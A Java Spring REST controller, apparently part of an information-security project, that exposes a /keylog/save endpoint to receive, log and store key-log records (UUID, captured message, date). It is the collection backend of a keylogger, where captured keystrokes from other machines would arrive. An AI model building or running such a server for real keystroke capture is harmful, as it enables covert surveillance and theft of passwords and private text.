package com.maemresen.infsec.keylogweb.restcontroller;

import com.maemresen.infsec.keylogweb.DateTimeHelper;
import com.maemresen.infsec.keylogweb.entity.KeyLog;
import com.maemresen.infsec.keylogweb.model.KeyLogModel;
import com.maemresen.infsec.keylogweb.service.IKeyLogService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

/**
 * @author Emre Sen - 14.05.2019
 * @contact maemresen07@gmail.com
 */
@RestController
@RequestMapping("/keylog")
public class KeyLogRestController {

    private Logger LOGGER = LoggerFactory.getLogger(KeyLogRestController.class);

    private final IKeyLogService keyLogService;

    public KeyLogRestController(IKeyLogService keyLogService) {
        this.keyLogService = keyLogService;
    }

    @PostMapping("/save")
    public String save(@RequestBody KeyLogModel keyLogModel) {
        LOGGER.info("Received Key Log"
                        + "\n\tUUID: {}"
                        + "\n\tMessage: {}"
                        + "\n\tDate: {}"

                , keyLogModel.getUuid()
                , keyLogModel.getMsg()
                , DateTimeHelper.getTheDateInString(keyLogModel.getKeyLogDate()));
        KeyLog keyLog = new KeyLog(keyLogModel);
        keyLogService.save(keyLog);
        return "Success";
    }

}
